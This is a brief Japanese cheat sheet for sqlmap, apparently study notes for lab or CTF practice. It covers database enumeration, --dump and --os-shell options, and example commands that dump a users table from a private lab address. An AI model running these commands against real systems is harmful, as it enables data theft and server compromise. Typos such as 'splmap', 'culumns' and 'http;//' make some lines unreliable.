# 解説
SQLインジェクションの脆弱性を自動で検出・悪用する
データベースの種類の特定、データ抽出、OS操作まで対応する

# 基本構文
```
splmap [オプション] -u "URL"
```

# 重要オプション

### ターゲット指定

```-u <URL>``` ターゲットとなるURL。パラメータを含む必要がある
```-r <file>```  HTTPリクエストを保存したテキストファイル（Burp suiteで作成）を読み込む
```--data="data``` POSTメソッドで送信するデータを指定
```--cookie="cookie"``` 認証用クッキーを指定

### 情報の抽出

```--dbs``` データベース名一覧を取得
```--tables``` データベース名を指定（```-D```）し、テーブル名一覧を取得
```--dump``` データベースに加えてテーブルを指定（```-T```）し、データを抽出
```--culumns``` 同じく、列名の一覧を取得
```--dump-all``` 同じく、データベース全体を抽出（非常に時間がかかる）
```--os-shell``` DBの管理者権限がある場合、ターゲットサーバー上でシェルを得られることがある。

### スキャンの強度・調整

```--batch``` すべての質問にデフォルトで自動回答する
```--level=<1-5>``` テストの深さ。数値が高いほど、CookieやHTTPヘッダーも詳しく調べる
```--risk=<1-3>``` テストの危険度。3にすると、データベースに負荷がかかったり内容が置き換わるリスクが有る。

# コマンド例
### データベース名の特定
```
sqlmap -u "http;//10.10.10.10/view.php?id=1" --dbs --batch
```
### 特定したデータベースのテーブルを特定
```
sqlmap -u "http://10.10.10.10/view.php?id=1" -D users_db --tables --batch
```
### 特定したテーブルから情報を盗む
```
sqlmap -u "http://10.10.10.10/view.php?id=1" -D users_db -T users --dump --batch
```
